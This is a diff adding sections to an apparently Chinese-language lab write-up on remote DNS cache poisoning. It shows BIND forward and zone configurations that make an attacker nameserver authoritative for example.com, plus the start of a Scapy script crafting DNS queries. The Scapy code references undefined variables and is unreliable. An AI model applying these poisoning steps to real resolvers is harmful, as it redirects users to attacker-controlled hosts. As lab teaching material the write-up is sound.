@@ -28,6 +28,114 @@ DNS请求通过UDP数据包发送，源端口号是16比特的随机数字
 他的思路不是让缓存失效，而是去修改域名服务器的上一级权威域名服务器。用一个随机的二级域名向远程DNS服务器发请求，
 在上一级权威域名服务器回复消息前，伪造消息给远程域名服务器，带上NS记录，如果猜错则继续用随机二级域名重试。  
 
+## 修改配置文件方式实现远程中毒攻击
+
+实验的目的是让ns.attacker32.com作为example.com的权威域名服务器  
+步骤：  
+0、配置用户机head文件和配置DNS服务器options和第二节一样  
+1、DNS服务器删除example.com这个区域  
+2、DNS服务器设置一个forward区域  
+由于没有真正拥有attacker32.com这个域名，但是修改配置也可以达到效果
+```bash
+vi /etc/bind/named.conf
+```
+
+```bash
+zone "attacker32.com" {
+    type forward;
+    forwarders {
+        192.168.230.156;
+    };
+};
+```
+3、配置攻击机  
+```bash
+vi /etc/bind/named.conf
+```
+```text
+zone "attacker32.com" {
+    type master;
+    file "/etc/bind/attacker32.com.zone";
+};
+zone "example.com" {
+    type master;
+    file "/etc/bind/example.com.zone";
+};
+```
+example.com.zone如下：
+```text
+$TTL 3D
+@       IN      SOA   ns.example.com. admin.example.com. (
+                2008111001
+                8H
+                2H
+                4W
+                1D)
+
+@       IN      NS    ns.attacker32.com.
+
+@       IN      A     1.2.3.4
+www     IN      A     1.2.3.5
+ns      IN      A     192.168.230.156
+*       IN      A     1.2.3.4
+```
+attacker32.com.zone如下：
+```text
+$TTL 3D
+@       IN      SOA   ns.attacker32.com. admin.attacker32.com. (
+                2008111001
+                8H
+                2H
+                4W
+                1D)
+
+@       IN      NS    ns.attacker32.com.
+
+@       IN      A     192.168.230.154
+www     IN      A     192.168.230.156
+ns      IN      A     192.168.230.156
+*       IN      A     10.0.2.10
+```
+4、在用户机测试  
+![dig测试](../img/dns-user-test.png)
+可以看到这个地址是由攻击机指定的
+
+指定权威域名服务器查询，会得到攻击机的地址
+![dig地址](../img/dns-spoof-nss.png)
+这是通过修改配置文件的方式实现了远程DNS中毒攻击
+
+## 攻击方式实现
+
+实现目标是，当用户访问www.example.com时，重定向到一个恶意的www.example.com
+
+完整的DNS查询过程如下：
+![正常过程](../img/dns-normal-req.png)
+
+example.com名称服务器被缓存情况下的DNS查询过程：
+![缓存情况](../img/dns-abnormal-req.png)
+
+缓存情况下的攻击比较复杂，要拆分成几个阶段
+
+### 实现构造DNS请求
+
+这个请求是从攻击者发往DNS服务器的
+
+```python
+#!/usr/bin/python3
+from scapy.all import *
+
+
+UDPpkt = UDP(dport=53)
+
+Qdsec    = DNSQR(qname='www.example.com') 
+dns   = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0, arcount=0, qd=Qdsec)
+ip  = IP(dst='192.168.230.154', src='192.168.230.156')
+udp = UDP
+
+Querypkt = IPpkt/UDPpkt/DNSpkt
+reply = sr1(Querypkt)
+ls(reply[DNS])
+```
 ```c
 #include <unistd.h>
 #include <stdio.h>
